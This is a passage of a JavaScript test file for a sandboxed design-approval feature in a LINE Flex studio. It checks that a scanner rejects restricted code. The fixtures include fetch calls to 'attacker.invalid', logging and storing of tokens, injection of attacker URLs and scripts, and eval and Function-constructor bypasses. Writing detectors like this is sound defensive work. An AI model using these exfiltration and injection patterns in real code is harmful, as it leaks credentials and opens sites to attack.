    ["token logging", "console.log(reviewToken)"],
    ["computed token logging", "console['log'](reviewToken)"],
    ["local storage", "localStorage.setItem('token', token)"],
    ["session storage", "sessionStorage.setItem('token', token)"],
    ["IndexedDB", "indexedDB.open('attempts')"],
    ["cookie", "document.cookie = token"],
    ["Cache Storage", "caches.open('attempts')"],
    ["Storage Manager", "navigator.storage.persist()"],
    ["resource binding", "make(doc, 'img', { attributes: { src: attackerUrl } })"],
    ["resource mutation", "image.src = attackerUrl"],
    ["loader injection", "document.createElement('script')"],
    ["HTML injection", "target.innerHTML = attackerMarkup"],
    [
      "remote producer for classified href",
      "let url = 'https://attacker.invalid/payload'; const attributes = { href: url }",
      ["line-flex-studio.mjs:href:url"]
    ],
    [
      "unclassified producer for validation source href",
      "const finding = { sourceUrl: 'https://attacker.invalid/reference' }; const attributes = { href: finding.sourceUrl }",
      ["line-flex-studio.mjs:href:finding.sourceUrl"]
    ],
    [
      "unclassified producer for local preview asset",
      "const draft = { hero: { localAsset: 'https://attacker.invalid/image.svg' } }; const attributes = { src: draft.hero.localAsset }",
      ["line-flex-studio.mjs:src:draft.hero.localAsset"]
    ]
  ];
  for (const [label, source, allowedBindings = []] of fixtures) {
    await t.test(label, () => {
      assert.throws(() => assertNoRestrictedCapabilities(
        [[label === "remote producer for classified href" ? "line-flex-studio.mjs" : "unsafe.mjs", source]],
        allowedBindings
      ));
    });
  }
});

test("valid JavaScript computed, escaped, template, and reflective bypasses fail closed", async (t) => {
  const fixtures = [
    ["computed global fetch", "globalThis['fetch']('https://attacker.invalid')"],
    ["computed global localStorage", "globalThis['localStorage'].setItem('token', token)"],
    ["computed global console logging", "globalThis['console']['log'](reviewToken)"],
    ["computed global Supabase call", "globalThis['supabase']['from']('records')"],
    ["computed global LINE profile API", "globalThis['liff'].getProfile()"],
    ["template literal Authorization", "new Headers([[`Authorization`, token]])"],
    ["escaped string Authorization", "new Headers([['Author\\u0069zation', token]])"],
    ["computed Supabase environment key", "process.env['SUPABASE_SERVICE_ROLE_KEY']"],
    ["escaped fetch identifier", "carrier.f\\u0065tch()"],
    ["computed resource binding", "const attributes = { ['href']: remoteUrl }"],
    ["reflective resource mutation", "Reflect.set(anchor, 'href', remoteUrl)"]
  ];
  for (const [label, source] of fixtures) {
    await t.test(label, () => {
      assert.doesNotThrow(() => new Function(source), `${label} fixture must remain valid JavaScript`);
      assert.throws(() => assertNoRestrictedCapabilities([["unsafe.mjs", source]]));
    });
  }
});

test("approved current token shapes remain accepted as safe controls", () => {
  for (const [label, source] of [
    ["approved global crypto", "globalThis.crypto.subtle"],
    ["approved local dialog", "const liff = { showModal() {} }; liff.showModal()"],
    ["safe template text", "const text = `Sandbox ${status}`"],
    ["safe computed accessibility property", "const attributes = { ['aria-label']: label }"],
    ["safe reflective read", "Reflect.get(anchor, 'title')"],
    ["safe timeout callback", "setTimeout(() => run(), 0)"],
    ["safe qualified timeout callback", "doc.defaultView.setTimeout(() => run(), 0)"],
    ["safe interval callback", "setInterval(function tick() { run(); }, 1000)"]
  ]) {
    assert.doesNotThrow(() => new Function(source), `${label} fixture must remain valid JavaScript`);
    assert.doesNotThrow(() => assertNoRestrictedCapabilities([["safe.mjs", source]]), label);
  }
});

test("valid JavaScript dynamic-code, hidden-header, global-open, and descriptor bypasses fail closed", async (t) => {
  const fixtures = [
    ["Function constructor", "Function(\"return globalThis.fetch('https://attacker.invalid')\")()"],
    ["eval", "eval(\"fetch('https://attacker.invalid')\")"],
    ["AsyncFunction constructor", "AsyncFunction(\"return globalThis.fetch('https://attacker.invalid')\")()"],
    ["GeneratorFunction constructor", "GeneratorFunction(\"yield globalThis.fetch('https://attacker.invalid')\")().next()"],
    ["async function constructor property", "(async function () {}).constructor(\"return globalThis.fetch('https://attacker.invalid')\")()"],
    ["generator function constructor property", "(function* () {}).constructor(\"yield globalThis.fetch('https://attacker.invalid')\")().next()"],
    ["string timeout", "setTimeout(\"fetch('https://attacker.invalid')\", 0)"],
    ["template string interval", "setInterval(`globalThis.${capability}()`, 1000)"],
    ["interpolated Authorization header", "new Headers([[`Author${'iz'}ation`, token]])"],
    ["concatenated Authorization header", "new Headers([['Author' + 'ization', token]])"],
    ["template process environment key", "process.env[`SUPABASE_${role}_KEY`]"],
    ["unqualified global open", "open(remoteUrl)"],
    ["defineProperty resource mutation", "Object.defineProperty(anchor, 'href', { value: remoteUrl })"],
    ["defineProperties resource mutation", "Object.defineProperties(anchor, Object.fromEntries([['href', { value: remoteUrl }]]))"]
  ];
  for (const [label, source] of fixtures) {
    await t.test(label, () => {
      assert.doesNotThrow(() => new Function(source), `${label} fixture must remain valid JavaScript`);
      assert.throws(() => assertNoRestrictedCapabilities([["unsafe.mjs", source]]));
    });
  }
});

test("every exact runtime file matches the canonical LF-normalized SHA-256 manifest", async () => {
  await assert.doesNotReject(() => assertExactRuntimeContentManifest());
});

test("runtime manifest rejects semantic alias and resource-key compositions outside scanner understanding", async (t) => {
  await assert.doesNotReject(() => assertExactRuntimeContentManifest());
  const studioSource = await read("line-flex-studio.mjs");
  for (const [label, addition] of [
    [
      "capability alias composition",
      "const runtimeRoot = globalThis; const capabilityKey = 'fe' + 'tch'; runtimeRoot[capabilityKey](endpoint);"
    ],
    [
      "resource key composition",
      "const resourceKey = 'hr' + 'ef'; const composedAttributes = { [resourceKey]: endpoint };"
    ]
  ]) {
    await t.test(label, async () => {
      const mutated = `${studioSource}\n${addition}\n`;
      assert.doesNotThrow(() => assertNoRestrictedCapabilities(
        [["line-flex-studio.mjs", mutated]], EXPECTED_DYNAMIC_RESOURCE_BINDINGS
      ), `${label} must remain outside the semantic classifier so the manifest is the backstop`);
      await assert.rejects(
        () => assertExactRuntimeContentManifest(new Map([["line-flex-studio.mjs", mutated]])),
        /runtime content manifest mismatch/
      );
    });
  }
});

test("equivalent English and Thai authority claims fail closed", async (t) => {
  for (const claim of [
    "Ready for production",
    "Approval succeeded",
    "Verified signer",
    "อนุมัติแล้ว",
    "พร้อมใช้งานจริง"
  ]) {
    await t.test(claim, () => {
      assert.throws(() => assertNoPositiveAuthorityClaim(claim, "unsafe fixture"));
    });
  }
});

test("sandbox record exposes only the exact non-authoritative fields", async () => {
  const record = await createSandboxVerificationRecord({
    recordId: "record_demo_001",
    correlationId: "correlation_demo_001",
    reviewSessionId: "review_session_demo_001",
    providerContext: "Daph Studio · A1 sandbox fixture",
    scopeContext: "Main kitchen review scope",
    workItemRef: "work_item_demo_001",
    approvalRequestRef: "request_demo_001",
    revisionLabel: "D-07",
    revisionId: "a".repeat(64),
    artifactManifestSha256: "b".repeat(64),
    canonicalizationVersion: "line-design-approval-v1",
    requestedCanonicalAction: "design.approve_revision",
    outcome: "sandbox_recorded",
    createdAt: "2026-08-02T03:00:00.000Z",
    confirmedAt: "2026-08-02T03:01:00.000Z"
  });
  assert.deepEqual(Object.keys(record), [
    "title", "recordVersion", "mode", "businessEffect", "recordId",
    "correlationId", "reviewSessionId", "providerContext", "scopeContext",
    "workItemRef", "approvalRequestRef", "revisionLabel", "revisionId",
    "artifactManifestSha256", "requestedCanonicalAction", "outcome",
    "createdAt", "confirmedAt", "digestAlgorithm", "canonicalizationVersion",
    "recordDigest"
  ]);
  const normalizedKeys = Object.keys(record).map((key) => key.replace(/[^a-z0-9]/gi, "").toLowerCase());
  for (const forbidden of [
    "tenant", "tenantid", "customer", "customerid", "role", "recipient",
    "project", "approvalstatus", "approved", "signature", "signaturestatus",
    "keyid", "privatekey", "publickey", "signingkey", "serverissuedidempotencykey",
    "reviewtoken", "token", "secret", "lineidtoken", "accesstoken", "audit",
    "auditcomplete", "production"
  ]) assert.equal(normalizedKeys.includes(forbidden), false, forbidden);
  assertNoPositiveAuthorityClaim(JSON.stringify(record), "sandbox record");
});

test("record and shell copy reject positive authority and production claims", async () => {
  const recordSource = await read("line-design-approval-record.mjs");
  const studioSource = await read("line-flex-studio.mjs");
  const html = await read("line-flex-studio.html");
  const copyStart = studioSource.indexOf("const DESIGN_APPROVAL_RECEIPT_COPY");
  const copyEnd = studioSource.indexOf("const designApprovalReviewCopyFor");
  assert.ok(copyStart >= 0 && copyEnd > copyStart);
  assertNoPositiveAuthorityClaim(recordSource, "record builder");
  assertNoPositiveAuthorityClaim(studioSource.slice(copyStart, copyEnd), "Design Approval copy");
  assertNoPositiveAuthorityClaim(html, "sandbox shell");
  assert.deepEqual(designApprovalReceiptCopyFor("en"), EXPECTED_DESIGN_APPROVAL_RECEIPT_COPY.en);
  assert.deepEqual(designApprovalReceiptCopyFor("th"), EXPECTED_DESIGN_APPROVAL_RECEIPT_COPY.th);
  assert.match(html, /Sandbox Verification Record — Demo · No Business Effect/);
  assert.match(html, /Workflow and approval status did not change\./);
  assert.match(html, /The digest is not a signature\./);
  for (const unsafe of [
    "Production-ready", "Production signature", "Approved", "Signed", "Audited",
    "Approval complete", "Audit recorded"
  ]) assert.throws(() => assertNoPositiveAuthorityClaim(unsafe, "unsafe fixture"));
});

test("Design Approval confirmation cannot pass editable draft data into the record path", async () => {
  const studioSource = await read("line-flex-studio.mjs");
  const start = studioSource.indexOf("export function createDesignApprovalJourneyController");
  const end = studioSource.indexOf("const BLOCKS", start);
  assert.ok(start >= 0 && end > start);
  const controllerSource = studioSource.slice(start, end);
  assert.doesNotMatch(controllerSource, /\bdraft\b|createDemoTransaction|confirmDemoTransaction|createDemoReceipt|receiptRowsFor/);
  const input = controllerSource.match(/const input = deepFreeze\(\{([\s\S]*?)\n\s*\}\);/)?.[1];
  assert.ok(input, "adapter confirmation input must remain explicit");
  assert.deepEqual([...input.matchAll(/^\s*([A-Za-z][A-Za-z0-9]*):/gm)].map((match) => match[1]), [
    "reviewSessionId", "serverIssuedIdempotencyKey", "expectedRevisionId", "decision"
  ]);
  assert.doesNotMatch(input, /tenant|customer|role|recipient|project|approvalStatus|\bdraft\b/i);
  assert.match(studioSource, /const result = await designJourney\.confirm\(\);/);
  assert.doesNotMatch(studioSource, /designJourney\.confirm\(\s*[^)]/);

  const recordSource = await read("line-design-approval-record.mjs");
  assert.doesNotMatch(recordSource,
    /serverIssuedIdempotencyKey|reviewToken|\bdraft\b|tenantId|customerId|approvalStatus/);
  assert.deepEqual(staticImportSpecifiers(recordSource), ["./line-flex-model.mjs"]);
});

test("package scripts expose the complete Design Approval gate and include it in core", async () => {
  const packageJson = JSON.parse(await read("package.json"));
  const designCommand = packageJson.scripts?.["test:design-approval"];
  assert.equal(
    designCommand,
    `node --test ${DESIGN_APPROVAL_TEST_FILES.join(" ")}`
  );
  const coreCommand = packageJson.scripts?.["test:core"] ?? "";
  assertCoreCommand(coreCommand);
});

test("core command inventory rejects removal or duplication of every test file", async (t) => {
  const packageJson = JSON.parse(await read("package.json"));
  const coreCommand = packageJson.scripts?.["test:core"] ?? "";
  for (const file of CORE_TEST_FILES) {
    await t.test(`remove ${file}`, () => {
      const mutated = coreCommand.replace(` ${file}`, "");
      assert.throws(() => assertCoreCommand(mutated));
    });
    await t.test(`duplicate ${file}`, () => {
      const mutated = `${coreCommand} ${file}`;
      assert.throws(() => assertCoreCommand(mutated));
    });
  }
});
